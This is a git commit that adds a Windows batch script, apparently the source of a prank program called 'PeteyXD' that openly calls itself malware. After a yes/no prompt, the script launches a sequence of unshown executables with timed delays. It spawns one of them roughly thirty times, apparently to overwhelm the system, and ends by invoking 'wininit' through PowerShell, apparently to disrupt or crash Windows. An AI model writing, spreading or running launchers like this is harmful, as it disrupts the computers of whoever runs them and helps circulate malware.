fde490b62a5659ea9931cb4d2970972dba3d7eca
1here3 <159972256+1here3@users.noreply.github.com>
2026-05-02 16:35:06 -0700

    Add files via upload

---
+++ PeteyXD.exe source code/PeteyXD.cmd
@@ -0,0 +1,77 @@
+@echo off
+1:
+color a
+echo Are you sure you want to run this malware?
+set /p input=
+if /i %input%==no goto love
+if /i %input%==Yes goto hate
+if /i not %input%== Yes,no goto 1
+:love
+echo wait what? NOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO-
+timeout 3
+exit
+
+:hate
+echo you just got hacket LOL LOL LOLLOL
+start 1.exe
+timeout 3
+start drk.exe
+timeout 15
+start ball.exe
+timeout 15
+start scatter.exe
+start sal.exe
+start mve.exe
+timeout 102
+start ball.exe
+taskkill /f /im drk.exe
+taskkill /f /im scatter.exe
+timeout 12
+start mlt.exe
+timeout 21
+start winver.exe
+start Petey_hd.png
+timeout 63
+start calc.exe
+timeout 1
+taskkill /f /im calc.exe
+taskkill /f /im mlt.exe
+taskkill /f /im winve.exe
+timeout 121
+start drk.exe
+timeout 2
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+start 1.exe
+taskkill /f /im ball.exe
+timeout 5
+powershell wininit
